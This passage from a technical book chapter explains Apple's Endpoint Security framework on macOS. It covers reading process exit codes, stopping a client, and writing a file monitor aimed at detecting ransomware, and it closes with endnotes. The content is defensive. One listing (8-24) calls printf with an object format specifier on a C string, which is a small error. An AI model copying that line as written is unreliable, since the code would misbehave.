<p class="TX">The event structure type for the <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXIT</span> event is <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exit_t</span>. By consulting the <i>ESMessage.h</i> header file, we can see that it contains a single (nonreserved) field named <span class="SANS_TheSansMonoCd_W5Regular_11">stat</span> containing the exit status of a process:</p>&#13;
&#13;
<pre><code>typedef struct {&#13;
    int stat;&#13;
    uint8_t reserved[64];&#13;
} es_event_exit_t;&#13;
</code></pre>&#13;
<p class="TX">Knowing this, we extract the process’s exit code, as shown in <a href="chapter8.xhtml#Lis8-21">Listing 8-21</a>.</p>&#13;
<span id="Lis8-21"/>&#13;
<pre><code><span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> case ES_EVENT_TYPE_NOTIFY_EXIT: {&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> int status = message-&gt;event.exit.stat;&#13;
    ...&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-21: Extracting an exit code</span></p>&#13;
<p class="TX">Because the process monitor logic has also registered for process execution events (<span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span>), the code first makes sure we’re dealing with a process exit (<span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXIT</span>) <span class="CodeAnnotation" aria-label="annotation1">❶</span>. If so, it then extracts the exit code <span class="CodeAnnotation" aria-label="annotation2">❷</span>.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
&#13;
<h4 class="H2" id="sec16"><span id="h2-65"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Stopping the Client</span></h4>&#13;
<p class="TNI">At some point, you might want to stop your Endpoint Security client. This is as simple as unsubscribing from events via the <span class="SANS_TheSansMonoCd_W5Regular_11">es_unsubscribe_all</span> function, then deleting the client via <span class="SANS_TheSansMonoCd_W5Regular_11">es_delete_client</span>. As shown in <a href="chapter8.xhtml#Lis8-22">Listing 8-22</a>, both functions take as arguments the client we previously created using the <span class="SANS_TheSansMonoCd_W5Regular_11">es_new_client</span> function.</p>&#13;
<span id="Lis8-22"/>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_200" aria-label="200"/>es_client_t* client = // Previously created via es_new_client&#13;
...&#13;
es_unsubscribe_all(client);&#13;
es_delete_client(client);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-22: Stopping an Endpoint Security client</span></p>&#13;
<p class="TX">See the <i>ESClient.h</i> header file for more details on the functions. For example, code should only call <span class="SANS_TheSansMonoCd_W5Regular_11">es_delete_client</span> from the same thread that originally created the client.</p>&#13;
<p class="TX">This wraps up the discussion of creating a process monitor capable of tracking process executions and exits, as well as extracting information from each event that we could feed into a variety of heuristic-based rules. Of course, you could register for many other Endpoint Security events. Let’s now explore file events, which provide the foundation for a file monitor.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
&#13;
<h3 class="H1" id="sec17"><span id="h1-54"/><span class="SANS_Futura_Std_Bold_B_11">File Monitoring</span></h3>&#13;
<p class="TNI">File monitors are powerful tools for detecting and understanding malicious code. For example, infamous ransomware groups such as Lockbit have begun targeting macOS,<sup><a role="doc-noteref" id="chapter8_5" href="#chapter8-5">5</a></sup> so you might want to write software that can identify ransomware. In my 2016 research paper “Towards Generic Ransomware Detection,” I highlighted a simple yet effective approach to doing so.<sup><a role="doc-noteref" id="chapter8_6" href="#chapter8-6">6</a></sup> In a nutshell, if we can monitor for the rapid creation of encrypted files by untrusted processes, we should be able to detect and thwart ransomware. Although any heuristic-based approach has its limitations, my method has proven successful even with new ransomware specimens. It even detected Lockbit’s foray into the macOS space in 2023.</p>&#13;
<p class="TX">A core capability of this generic ransomware detection is the ability to monitor for the creation of files. Using Endpoint Security, it’s easy to create a file monitor that can detect file creation and other file I/O events.<sup><a role="doc-noteref" id="chapter8_7" href="#chapter8-7">7</a></sup> You can find source code for a fully featured file monitor in the <i>FileMonitor</i> project on Objective-See’s GitHub repository at <a href="https://github.com/objective-see/FileMonitor"><i>https://<wbr/>github<wbr/>.com<wbr/>/objective<wbr/>-see<wbr/>/FileMonitor</i></a>.</p>&#13;
<p class="TX">Because I’ve already discussed how to create an Endpoint Security client and register for events of interest, I won’t spend time discussing these topics again. Instead, I’ll focus on the specifics of monitoring file events. In the <i>ESTypes.h</i> header file, we find many events covering file I/O. Some of the most useful notification events include:</p>&#13;
<blockquote>&#13;
<p class="EX1"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_EVENT_TYPE_NOTIFY_CREATE</b></span> Delivered when a new file is created</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_EVENT_TYPE_NOTIFY_OPEN</b></span> Delivered when a file is opened</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_EVENT_TYPE_NOTIFY_WRITE</b></span> Delivered when a file is written to</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_EVENT_TYPE_NOTIFY_CLOSE</b></span> Delivered when a file is closed</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_EVENT_TYPE_NOTIFY_RENAME</b></span> Delivered when a file is renamed</p>&#13;
<p class="EX2"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_EVENT_TYPE_NOTIFY_UNLINK</b></span> Delivered when a file is deleted</p>&#13;
</blockquote>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_201" aria-label="201"/>Let’s register for the events related to file creation, opening, closing, and deleting (<a href="chapter8.xhtml#Lis8-23">Listing 8-23</a>).</p>&#13;
<span id="Lis8-23"/>&#13;
<pre><code>es_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_CREATE, ES_EVENT_TYPE_NOTIFY_OPEN,&#13;
ES_EVENT_TYPE_NOTIFY_CLOSE, ES_EVENT_TYPE_NOTIFY_UNLINK};&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-23: File I/O events of interest</span></p>&#13;
<p class="TX">After creating a new Endpoint Security client using <span class="SANS_TheSansMonoCd_W5Regular_11">es_new_client</span>, we can invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">es_subscribe</span> function with the new list of events of interest to subscribe to. The subsystem should then begin delivering file I/O events to us, encapsulated in <span class="SANS_TheSansMonoCd_W5Regular_11">es_message_t</span> structures. Recall the <span class="SANS_TheSansMonoCd_W5Regular_11">es_message_t</span> structure contains meta information about the event, such as the event type and process responsible for triggering it. A file monitor could use this information to map the delivered file event to the responsible process.</p>&#13;
<p class="TX">Besides reporting the event type and responsible process, a file monitor should also capture the filepath (which, in the case of file creation events, leads to the created file). The steps required to extract the path depend on the specific file I/O event, so we’ll look at each in detail, starting with file creation events.</p>&#13;
<p class="TX">We’ve subscribed to <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_CREATE</span>, so whenever a file is created, Endpoint Security will deliver a message to us. The event data for this event is stored in a structure of type <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_create_t</span>:</p>&#13;
&#13;
<pre><code>typedef struct {&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> es_destination_type_t destination_type;&#13;
    union {&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> es_file_t* _Nonnull existing_file;&#13;
            struct {&#13;
                es_file_t* _Nonnull dir;&#13;
                es_string_token_t filename;&#13;
                mode_t mode;&#13;
            } new_path;&#13;
        } destination;&#13;
        ...&#13;
    };&#13;
} es_event_create_t;&#13;
</code></pre>&#13;
<p class="TX">Though this structure appears a bit involved at first blush, handling it is fairly trivial in most cases. The <span class="SANS_TheSansMonoCd_W5Regular_11">destination_type</span> member should be set to one of two enumeration values <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Apple explains the difference between the two in the <i>ESMessage.h</i> header file:</p>&#13;
<blockquote>&#13;
<p class="EXO">Typically, <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_CREATE</span> events are fired after the object has been created and the <span class="SANS_TheSansMonoCd_W5Regular_11">destination_type</span> will be <span class="SANS_TheSansMonoCd_W5Regular_11">ES_DESTINATION_TYPE_EXISTING_FILE</span>. The exception to this is for notifications that occur if an ES client responds to an <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_AUTH_CREATE</span> event with <span class="SANS_TheSansMonoCd_W5Regular_11">ES_AUTH_RESULT_DENY</span>.</p>&#13;
</blockquote>&#13;
<p class="TX">As a simple file monitor won’t register for <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_AUTH_*</span> events, we can focus on the former case here.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_202" aria-label="202"/>We’ll locate the path to the file that was just created in the <span class="SANS_TheSansMonoCd_W5Regular_11">existing_file</span> member, found in the <span class="SANS_TheSansMonoCd_W5Regular_11">destination</span> union of the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_create_t</span> structure <span class="CodeAnnotation" aria-label="annotation2">❷</span>. As <span class="SANS_TheSansMonoCd_W5Regular_11">existing_file</span> is stored as an <span class="SANS_TheSansMonoCd_W5Regular_11">es_file_t</span>, extracting the newly created file’s path is trivial, as shown in <a href="chapter8.xhtml#Lis8-24">Listing 8-24</a>.</p>&#13;
<span id="Lis8-24"/>&#13;
<pre><code>// Event type: ES_EVENT_TYPE_NOTIFY_CREATE&#13;
&#13;
if(ES_DESTINATION_TYPE_EXISTING_FILE == message-&gt;event.create.destination_type) {&#13;
    es_string_token_t* token = &amp;message-&gt;event.create.destination.existing_file-&gt;path;&#13;
&#13;
    NSString* path = [[NSString alloc] initWithBytes:token-&gt;data length:token-&gt;length encoding:&#13;
    NSUTF8StringEncoding];&#13;
&#13;
    printf("Created path -&gt; %@\n", path.UTF8String);&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-24: Extracting a newly created filepath</span></p>&#13;
<p class="TX">Because we’ve also registered for <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_OPEN</span> events, Endpoint Security will deliver a message containing an <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_open_t</span> event structure whenever a file is opened. This structure contains an <span class="SANS_TheSansMonoCd_W5Regular_11">es_file_t</span> pointer to a member-named file containing the path of the opened file. We extract it in <a href="chapter8.xhtml#Lis8-25">Listing 8-25</a>.</p>&#13;
<span id="Lis8-25"/>&#13;
<pre><code>if(ES_EVENT_TYPE_NOTIFY_OPEN == message-&gt;event_type) {&#13;
    es_string_token_t* token = &amp;message-&gt;event.open.file-&gt;path;&#13;
&#13;
    NSString* path = [[NSString alloc] initWithBytes:token-&gt;data length:token-&gt;length&#13;
    encoding:NSUTF8StringEncoding];&#13;
&#13;
    printf("Opened file -&gt; %s\n", path.UTF8String);&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-25: Extracting an opened filepath</span></p>&#13;
<p class="TX">The logic for <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_CLOSE</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_UNLINK</span> is similar, as both event structures contain an <span class="SANS_TheSansMonoCd_W5Regular_11">es_file_t*</span> with the file’s path.</p>&#13;
<p class="TX">I’ll end this section by discussing a file event that has both a source and destination path. For example, when a file is renamed, Endpoint Security delivers a message of type <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_RENAME</span>. In that case, the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_rename_t</span> structure contains a pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_file_t</span> structure for the source file (aptly named <span class="SANS_TheSansMonoCd_W5Regular_11">source</span>), as well as one for the destination file (named <span class="SANS_TheSansMonoCd_W5Regular_11">existing_file</span>). We can access the path of the original file via <span class="SANS_TheSansMonoCd_W5Regular_11">message-&gt;event.rename.source-&gt;path</span>.</p>&#13;
<p class="TX">Obtaining the renamed file’s destination path is slightly nuanced, as we must first check the <span class="SANS_TheSansMonoCd_W5Regular_11">destination_type</span> field of the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_rename_t</span> structure. This field is an enumeration containing two values: <span class="SANS_TheSansMonoCd_W5Regular_11">ES_DESTINATION_TYPE_EXISTING_FILE</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">ES_DESTINATION_TYPE_NEW_PATH</span>. For the existing file value, we can directly access the destination filepath via <span class="SANS_TheSansMonoCd_W5Regular_11">rename.destination.existing_file-&gt;path</span> (assuming we have an <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_rename_t</span> structure named <span class="SANS_TheSansMonoCd_W5Regular_11">rename</span>). <span role="doc-pagebreak" epub:type="pagebreak" id="pg_203" aria-label="203"/>For the destination value, however, we must concatenate the destination directory with the destination filename; we’ll find the directory in <span class="SANS_TheSansMonoCd_W5Regular_11">rename .destination.new_path.dir-&gt;path</span> and the filename in <span class="SANS_TheSansMonoCd_W5Regular_11">rename.destination.new _path.filename</span>.</p>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec18">&#13;
&#13;
<h3 class="H1" id="sec18"><span id="h1-55"/><span class="SANS_Futura_Std_Bold_B_11">Conclusion</span></h3>&#13;
<p class="TNI">This chapter introduced Endpoint Security, the de facto standard framework for writing security tools on macOS. We built foundational monitoring and detection tools by subscribing to notifications for process and file events. In the next chapter, I’ll continue discussing Endpoint Security but focus on more advanced topics, such as muting, as well as <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_AUTH_*</span> events, which provide a mechanism for proactively detecting and thwarting malicious activity on the system. In <a href="part3.xhtml">Part III</a>, I’ll continue this discussion by detailing the creation of fully featured tools built atop Endpoint Security.</p>&#13;
</section>&#13;
<section epub:type="rearnotes" role="doc-endnotes" aria-labelledby="sec19">&#13;
&#13;
<h3 class="H1" id="sec19"><span class="SANS_Futura_Std_Bold_B_11">Notes</span></h3>&#13;
<ol class="footnotes">&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter8-1" href="#chapter8_1">  1</a></span>.  “Endpoint Security,” Apple Developer Documentation, <a href="https://developer.apple.com/documentation/endpointsecurity"><i>https://<wbr/>developer<wbr/>.apple<wbr/>.com<wbr/>/documentation<wbr/>/endpointsecurity</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter8-2" href="#chapter8_2">  2</a></span>.  You can read more about <span class="SANS_TheSansMonoCd_W5Regular_11">eslogger</span> in its man pages or in “Blue Teaming on macOS with eslogger,” CyberReason, October 3, 2022, <a href="https://www.cybereason.com/blog/blue-teaming-on-macos-with-eslogger"><i>https://<wbr/>www<wbr/>.cybereason<wbr/>.com<wbr/>/blog<wbr/>/blue<wbr/>-teaming<wbr/>-on<wbr/>-macos<wbr/>-with<wbr/>-eslogger</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter8-3" href="#chapter8_3">  3</a></span>.  You can read about this malware in Patrick Wardle, “Ironing Out (the macOS) Details of a Smooth Operator (Part II),” Objective-See, April 1, 2023, <a href="https://objective-see.org/blog/blog_0x74.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x74<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter8-4" href="#chapter8_4">  4</a></span>.  For more information on macOS LOLBins, see the Living Off the Orchard: macOS Binaries (LOOBins) repository on GitHub: <a href="https://github.com/infosecB/LOOBins"><i>https://<wbr/>github<wbr/>.com<wbr/>/infosecB<wbr/>/LOOBins</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter8-5" href="#chapter8_5">  5</a></span>.  Patrick Wardle, “The LockBit Ransomware (Kinda) Comes for macOS,” Objective-See, April 16, 2023, <a href="https://objective-see.org/blog/blog_0x75.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x75<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter8-6" href="#chapter8_6">  6</a></span>.  Patrick Wardle, “Towards Generic Ransomware Detection,” Objective -See, <span class="endnoteentry_Endnote-Text-Char">April 20, 2016,</span> <a href="https://objective-see.org/blog/blog_0x0F.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x0F<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter8-7" href="#chapter8_7">  7</a></span>.  To read more about creating a full file monitor, see Patrick Wardle, “Writing a File Monitor with Apple’s Endpoint Security Framework,” Objective-See, September 17, 2019, <a href="https://objective-see.org/blog/blog_0x48.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x48<wbr/>.html</i></a>. See also <span class="Xref"><a href="chapter11.xhtml">Chapter 11</a></span>, which discusses the BlockBlock tool.</p></li>&#13;
</ol>&#13;
</section>&#13;
</section>&#13;
</div>
</div>
</body></html>